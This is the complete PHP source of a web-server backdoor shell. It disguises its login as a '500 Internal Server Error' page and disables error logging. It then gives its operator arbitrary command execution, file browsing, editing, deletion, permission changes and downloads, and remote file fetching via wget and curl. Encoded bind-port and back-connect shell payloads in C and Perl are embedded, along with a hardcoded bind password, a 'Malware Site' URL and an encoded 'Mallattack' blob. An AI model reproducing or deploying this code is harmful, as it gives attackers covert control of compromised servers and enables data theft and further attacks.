<?php

# Jembut Loyality!
# Kapaljetz666 !
# Wassalam


@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$auth_pass="d7b6e9d219bded316d298ce3ca4071ce";
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('html_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@ini_set('file_uploads',1);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@define('VERSION', '2.1');
if( get_magic_quotes_gpc() ) {
function stripslashes_array($array) {
return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
}
$_POST = stripslashes_array($_POST);
}
function printLogin() {
?>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator Kapaljetz666 and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p>
<p>More information about this error may be available in the server error log.</p>
<p>Additionally, a 500 Internal Server Error error was encountered while trying to use an ErrorDocument to handle the request.</p>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
    <pre align=center>
    <form method=post>
    <input type=password name=pass>
    </form></pre>
	
    <?php 
   exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
		
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
	$file = $_GET['dl'];
	$filez = @file_get_contents($file);
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file)."\";");
   echo $filez; 
    exit; 
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
	$file = $_GET['dlgzip'];
	$filez = gzencode(@file_get_contents($file));
   header("Content-Type:application/x-gzip\n"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
   echo $filez; 
    exit; 
}
// view image
if(isset($_GET['img'])){
		@ob_clean(); 
		$d = magicboom($_GET['y']);
		$f = $_GET['img'];
		$inf = @getimagesize($d.$f); 
   		$ext = explode($f,"."); 
   		$ext = $ext[count($ext)-1]; 
   	 	@header("Content-type: ".$inf["mime"]);
   	 	@header("Cache-control: public"); 
  		@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
  		@header("Cache-control: max-age=".(60*60*24*7));  
   	 	@readfile($d.$f); 
   	 	exit; 
}

// server software
$software = getenv("SERVER_SOFTWARE");
// check safemode
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
// uname -a
$system = @php_uname();
// mysql
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:white'>ON</font></b>";}else {return "<b><font style='color:#DD4736'>OFF</font></b>";}}
function testmysql() {if (function_exists('mysql_connect')) {return showstat("on");}else {return showstat("off");}}
function testcurl() {if (function_exists('curl_version')) {return showstat("on");}else {return showstat("off");}}
function testwget() {if (exe('wget --help')) {return showstat("on");}else {return showstat("off");}}
function testperl() {if (exe('perl -h')) {return showstat("on");}else {return showstat("off");}}
// check os
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE; 
// change directory
if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}
//hdd
function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}

// username, id, shell prompt and working directory
if(!$win){
	if(!$user = rapih(exe("whoami"))) $user = "";
	if(!$id = rapih(exe("id"))) $id = "";
	$prompt = $user." \$ ";
	$pwd = @getcwd().DIRECTORY_SEPARATOR;
}
else {
	$user = @get_current_user();
	$id = $user;
	$prompt = $user." &gt;";
	$pwd = realpath(".")."\\";
	// find drive letters
 	$v = explode("\\",$d); 
	$v = $v[0]; 
 	foreach (range("A","Z") as $letter) 
 	{ 
	  $bool = @is_dir($letter.":\\");
	  if ($bool) 
	  { 
 		  $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
		   if ($letter.":" != $v) {$letters .= $letter;} 
		   else {$letters .= "<span class=\"gaya\">".$letter."</span>";} 
		   $letters .= " ]</a> "; 
  	  }	 
 } 
}

function testoracle() {
    if (function_exists('ocilogon')) { return showstat("on"); }
    else { return showstat("off"); }
    }

function testmssql() {
    if (function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
    }

 function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
    }
	
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
// server ip
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
// your ip ;-)
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_id=$_SERVER['SERVER_ADMIN'];
$bindport = "13123";
$bindport_pass = "asd123";
//server port
$serverport = $_SERVER["SERVER_PORT"];

// separate the working direcotory
$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
for($i = 0 ; $i < sizeof($pwds)-1 ; $i++){
	$pathz = "";
	for($j = 0 ; $j <= $i ; $j++){
		$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
	}
	$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
}
	
// rename file or folder
if(isset($_POST['rename'])){
	$old = $_POST['oldname'];
	$new = $_POST['newname'];
	@rename($pwd.$old,$pwd.$new);
	$file = $pwd.$new;
}
if(isset($_POST['chmod'])){ 
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}
	
if(isset($_POST['chmod_folder'])){
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}


// print useful info
$buff  = "Software : <b>".$software."</b><br />";
$buff .= "System OS : <b>".$system."</b><br />";
if($id != "") $buff .= "ID : <b>".$id."</b><br />";
$buff .= "PHP Version : <b><font style='color:#ff0000'>".phpversion()."</b></font> on <b>".php_sapi_name()."</b><br />";
$buff .= "Server ip : <b><font style='color:#ff0000'>".$server_ip."</font></b> <span class=\"gaya\"> | </span> Server Port : <b><font style='color:#ff0000'>".$serverport."</font><b> <span class=\"gaya\"> | </span>
Your   ip : <b><font style='color:#ff0000'>".$my_ip."</font></b><span class=\"gaya\"> | </span> Admin : <b><font style='color:white'>".$admin_id."</font></b><br />";
$buff .= "Free Disk: "."<span style='color:#00FF1E'><b>".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."</b></span><br />";
if($safemode) $buff .= "Safemode: <span class=\"gaya\"><b><font style='color:#ff0000'>ON</font></b></span><br />";
else $buff .= "Safemode: <span class=\"gaya\"><b><font style='color:red'>OFF</b></font></span><br />";
$buff .=" Time On Server : <b> ".date("d M Y H:i:s",time());
$buff .= "<br> Disabled Functions: ".showdisablefunctions()."<br />";
$buff .= "MySQL: ".testmysql()."&nbsp;|&nbsp;MSSQL: ".testmssql()."&nbsp;|&nbsp;Oracle: ".testoracle()."&nbsp;|&nbsp;Perl: ".testperl()."&nbsp;|&nbsp;cURL: ".testcurl()."&nbsp;|&nbsp;WGet: ".testwget()."<br>";
$buff .= "<font color=00ff00 ><b>".$letters."&nbsp;&gt;&nbsp;".$pwdurl."</b></font>";
$injbuff = " gw mah gak main logger bro slow :)"; 
eval(base64_decode($injbuff));




function rapih($text){
	return trim(str_replace("<br />","",$text));
}

function magicboom($text){
	if (!get_magic_quotes_gpc()) {
   		 return $text;
	} 
	return stripslashes($text);
}

function showdir($pwd,$prompt){
	$fname = array();
	$dname = array();
	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
	else $posix = FALSE;
	$user = "????:????";
	if($dh = @scandir($pwd)){
		foreach($dh as $file){
			if(is_dir($file)){
				$dname[] = $file;
			}
			elseif(is_file($file)){
				$fname[] = $file;
			}
		}
	}
	else{
		if($dh = @opendir($pwd)){
			while($file = @readdir($dh)){
				if(@is_dir($file)){
					$dname[] = $file;
				}
				elseif(@is_file($file)){
					$fname[] = $file;
				}
			}
			@closedir($dh);
		}
	}

	
	sort($fname);
	sort($dname);
	$path = @explode(DIRECTORY_SEPARATOR,$pwd);
	$tree = @sizeof($path);
	$parent = "";
	$buff = "
	<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table class=\"cmdbox\" style=\"width:50%;\">
	<tr><td><b>$prompt</b></td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form>
	<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\">
	<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
	<tr><td><b>view file/folder</b></td><td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" /><input class=\"inputzbut\" type=\"submit\" value=\"View !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form></table><table class=\"explore\">
	<tr><th>name</th><th style=\"width:80px;\">size</th><th style=\"width:210px;\">owner:group</th><th style=\"width:80px;\">perms</th><th style=\"width:110px;\">modified</th><th style=\"width:190px;\">actions</th></tr>
	";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $pwd;  

	foreach($dname as $folder){
		if($folder == ".") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">".$owner."</td><td><center>".get_perms($pwd)."</center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\">
			<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form></td>
			
			</tr>
			";
		}
		elseif($folder == "..") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'>   $folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">".$owner."</td>
			<td><center>".get_perms($parent)."</center></td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
			<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			</td></tr>";
		}
		else {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />     [ $folder ]</b></a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
			</form><td>DIR</td><td style=\"text-align:center;\">".$owner."</td>
			<td><center>
			<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
			<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" /></form></center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td><td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a></td></tr>";
		}
	}

	foreach($fname as $file){
		$full = $pwd.$file;
		if(!$win && $posix){
			$name=@posix_getpwuid(@fileowner($folder));
			$group=@posix_getgrgid(@filegroup($folder));
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
		}
		else {
			$owner = $user;
		}		
		$buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' />   $file</b></a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
		</form></td><td>".ukuran($full)."</td><td style=\"text-align:center;\">".$owner."</td><td><center>
		<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" /></form></center></td>
		<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td>
		<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
	}
	$buff .= "</table>";
	return $buff;
}

function ukuran($file){
	if($size = @filesize($file)){
		if($size <= 1024) return $size;
		else{
			if($size <= 1024*1024) {
				$size = @round($size / 1024,2);;
				return "$size kb";
			}
			else {
				$size = @round($size / 1024 / 1024,2);
				return "$size mb";	
			}
		}
	}
	else return "???";
}

function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function tulis($file,$text){
	$textz = gzinflate(base64_decode($text));
	 if($filez = @fopen($file,"w"))
	 {
		 @fputs($filez,$textz);
		 @fclose($file);
	 }
}

function ambil($link,$file) { 
   if($fp = @fopen($link,"r")){
	   while(!feof($fp)) { 
   		    $cont.= @fread($fp,1024); 
   		} 
   		@fclose($fp); 
	   $fp2 = @fopen($file,"w"); 
	   @fwrite($fp2,$cont); 
	   @fclose($fp2); 
   }
}

function which($pr){
	$path = exe("which $pr");
	if(!empty($path)) { return trim($path); } else { return trim($pr); }
}

function download($cmd,$url){
	$namafile = basename($url);
	switch($cmd) {
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
		case 'wfread' : ambil($wurl,$namafile);break;
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
		default: break;
	}
	return $namafile;
}

function get_perms($file)
{
	if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
}

function clearspace($text){
	return str_replace(" ","_",$text);
}


// net tools
$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL
3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug
Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk
HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W
tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL
ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6
uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1
NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg
tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD
e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0
LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo
vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB
+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St
ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j
S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ
ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw
Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA
BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95
zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75
i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A
RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
// Malware Site
$malsite = "http://fightagent.ru";  
	$self=$_SERVER["PHP_SELF"];

//Mallattack
$mal = "eNqV0UtrAjEQAOC70P8wYHsRyRa8FYpQSR9QXAmCBxHJrkMSjDNhk/pA/O+uFuyx5javj4GZLrzJj68xzLhZTRqM8aGjcNe4hJKMI4SSbpUyJMcUwZHFNr/VR0wreDp+TqeTpZLvUkl1AtHTcS1q3ojeI8zHo36pFv8Jw2w8ZoBNpMuK+0HlyOQJ77aYJzT7TOCT3rqYdB7Dfd0280xE3dRWHLRl/lV/RP14bEfAphReisJ4rrQPvGt/TcboZK8BXy9eOBLBhiG9Dp5hrvrfizOeH7rw";
//PerlConfig
